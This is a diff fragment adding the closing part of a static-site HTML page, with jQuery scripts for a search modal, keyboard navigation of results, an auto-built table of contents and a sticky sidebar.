+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script>
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
 </html>
+
